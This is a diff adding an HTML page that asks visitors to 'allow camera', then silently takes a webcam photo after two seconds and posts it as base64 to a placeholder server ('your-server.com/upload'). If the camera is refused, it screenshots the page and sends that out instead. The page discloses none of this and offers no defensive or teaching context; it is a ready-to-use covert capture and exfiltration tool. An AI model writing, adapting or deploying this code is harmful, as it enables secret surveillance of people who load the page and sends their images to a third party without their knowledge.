@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+</head>
+<body>
+    <h1>Click to allow camera</h1>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        // Capture webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+// Take photo after 2 seconds
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+// Convert to base64
+                    const imageData = canvas.toDataURL('image/png');
+
+// Send to your server (replace URL)
+                    fetch('https://your-server.com/upload', {
+                        method: 'POST',
+                        body: JSON.stringify({ image: imageData })
+                    });
+
+// Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            })
+            .catch(err => {
+                console.error('Camera error:', err);
+                // Fallback: take screenshot of page
+                html2canvas(document.body).then(canvas => {
+                    const imageData = canvas.toDataURL('image/png');
+                    fetch('https://your-server.com/upload', {
+                        method: 'POST',
+                        body: JSON.stringify({ image: imageData })
+                    });
+                });
+            });
+    </script>
+    <!-- html2canvas library for screenshot fallback -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</body>
+</html>
